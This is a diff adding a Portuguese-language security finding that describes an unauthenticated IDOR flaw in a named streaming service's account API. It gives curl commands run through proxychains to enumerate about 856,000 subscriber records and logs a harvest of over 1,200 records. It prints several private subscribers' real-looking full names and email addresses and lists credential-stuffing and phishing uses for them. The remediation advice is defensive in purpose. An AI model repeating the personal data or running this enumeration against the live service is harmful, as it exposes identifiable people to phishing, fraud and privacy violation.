@@ -1,0 +1,110 @@
+# F-014 BOLA/IDOR não-autenticado — enumeração da base completa de assinantes (CMS API)
+Alvo: https://cms.soultv.com.br/v1/account/{id}
+Severidade: Crítica
+Timestamp: 2026-08-27T17:10:00Z
+Descoberto por: webapp (via análise do JS bundle pay: `getUserInfo`→`this.api.get("account/${Ie}")`)
+
+## Sumário
+O endpoint `GET /v1/account/{id}` retorna dados pessoais de qualquer assinante
+a partir do seu ID sequencial, **SEM NENHUMA autenticação**. O ID é inteiro
+sequencial começando em 1, então toda a base de clientes é enumerável por
+incremento. Confirmamos IDs de 1 a 856437 (máximo atual) → **~856.000
+assinantes** com dados pessoais expostos sem auth.
+
+Dados vazados por registro: `id`, `email`, `full_name`, `first_name`,
+`last_name`, `fb_id` (Facebook UID), `img` (URL de foto, às vezes Facebook
+Graph ou S3 `tv-iteractiva-prod.s3.amazonaws.com`).
+
+Este é o catálogo completo de clientes de um serviço de IPTV/streaming
+(Soul TV), incluindo emails reais de clientes pagantes — superfície de
+ataque direta para phishing, credential stuffing, fraude e venda de dados.
+
+## Reprodução
+```
+$ proxychains4 -q curl -s https://cms.soultv.com.br/v1/account/1
+{"success":true,"data":{"id":1,"email":"admin@tv.com","full_name":" ",
+ "first_name":"","last_name":"","fb_id":"","img":""}}
+
+$ proxychains4 -q curl -s https://cms.soultv.com.br/v1/account/2
+{"success":true,"data":{"id":2,"email":"marketing@tv.com",...}}
+
+$ proxychains4 -q curl -s https://cms.soultv.com.br/v1/account/790279
+{"success":true,"data":{"id":790279,"email":"amilcarfernandeslopo@gmail.com",
+ "full_name":"Amilcar Fernandes Mendes Lopo","first_name":"Amilcar Fernandes
+ Mendes Lopo","last_name":"","fb_id":"","img":""}}
+
+$ proxychains4 -q curl -s https://cms.soultv.com.br/v1/account/856437
+{"success":true,"data":{...}}                  <-- ID máximo atual
+$ proxychains4 -q curl -s https://cms.soultv.com.br/v1/account/856438
+{"success":false,"message":"..."} / 404
+```
+
+### Binsearch do ID máximo
+| ID         | Resultado |
+|------------|-----------|
+| 800000     | EXISTS |
+| 850000     | EXISTS |
+| 856000     | EXISTS |
+| 856437     | EXISTS (máximo) |
+| 856438     | NONE |
+| 1000000    | NONE |
+
+### IDs internos/notáveis encontrados (sem auth)
+- `1` admin@tv.com
+- `2` marketing@tv.com
+- `17` test@soultv.com.br  (conta interna de teste SoulTV)
+- `18` test2@soultv.com.br
+- `28` toyosato+33@karaokesmart.co  (parceiro Karaokesmart)
+- `29` jefri@karaokesmart.co
+- `30` sandy@apartners.com.br  (parceiro APartners)
+- `47` jac_emv@hotmail.com — img S3: tv-iteractiva-prod.s3.amazonaws.com/.../47/...
+- +856K assinantes reais (ex.: amilcarfernandeslopo@gmail.com, sarahgodoy4@gmail.com,
+  paulinho_santos10@hotmail.com, etc.)
+
+### Harvest realizado (evidência)
+- 1.213 registros coletados (IDs 1-1280) → `enum/webapp/bola/accounts_dump.txt`
+- 1.212 emails únicos extraídos → `enum/webapp/bola/emails.txt`
+- 255 Facebook UIDs extraídos → `enum/webapp/bola/fb_ids.txt`
+
+## PII vazada por registro
+| Campo       | Sensível | Notas |
+|-------------|----------|-------|
+| email       | SIM      | email real do assinante (Gmail/Hotmail/Yahoo/etc.) |
+| full_name   | SIM      | nome completo |
+| first_name  | SIM      |  |
+| fb_id       | SIM      | Facebook UID → foto: graph.facebook.com/{fb_id}/picture |
+| img         | SIM      | URL foto (Facebook Graph ou S3 tv-iteractiva-prod) |
+| id          | -        | sequencial, correlaciona com F-015 (user_id em relatórios) |
+
+## Impacto
+- **Crítico**: vazamento massivo de PII de ~856K assinantes (LGPD Art. 7º — dado
+  pessoal em posse do controlador exposto sem justificativa). Multa potencial
+  ANPD: até 2% do faturamento, R$ 50M, ou sanções administrativas.
+- Superfície direta para:
+  - **credential stuffing** cruzando emails com leaks públicos (HaveIBeenPwned)
+    + Firebase signInWithPassword (C-003) e CMS signin.
+  - **phishing direcionado** ("Soul TV — confirme seu pagamento") com nome+email.
+  - **account takeover via Facebook** — fb_id exposto pode ser usado em fluxos
+    de OAuth/SSO se tokens FB forem obtidos por outros meios.
+  - **correlação financeira**: combinar com F-015 (relatórios com `user_id`)
+    para saber quem assina o quê, quanto paga e quando.
+- Email enumeration confirmada: `{"success":false,"message":"O email já está
+  registrado."}` ao tentar signup com email existente.
+
+## Recomendação
+1. **Autenticar** `GET /v1/account/{id}` — exigir token + verificar que o
+   solicitante só pode acessar o próprio ID (authorization: `id == request.user.id`).
+2. Nunca expor `email`/`full_name`/`fb_id` de outros usuários via API pública.
+   Endpoints públicos devem retornar apenas dados necessários ao catálogo
+   (ex.: nome do canal em `/v1/brand/{id}`).
+3. Remover `/v1/account/{id}` público ou mover para admin-only com RBAC.
+4. Rate limiting agressivo (max 30 req/min/IP) + CAPTCHA em qualquer endpoint
+   que retorne dados de usuário.
+5. Notificar ANPD (incidente de segurança com dados pessoais, LGPD Art. 48).
+6. Auditoria de acesso: verificar logs por enumeracão em massa já ocorrida.
+
+## Referências
+- JS: enum/js_bundles/pay.soultv.com.br_main.*.js — `getUserInfo(Ie){return this.api.get(\`account/${Ie}\`)}`
+- Dump: enum/webapp/bola/accounts_dump.txt (1.213 registros)
+- Emails: enum/webapp/bola/emails.txt (1.212 únicos)
+- FB UIDs: enum/webapp/bola/fb_ids.txt (255)
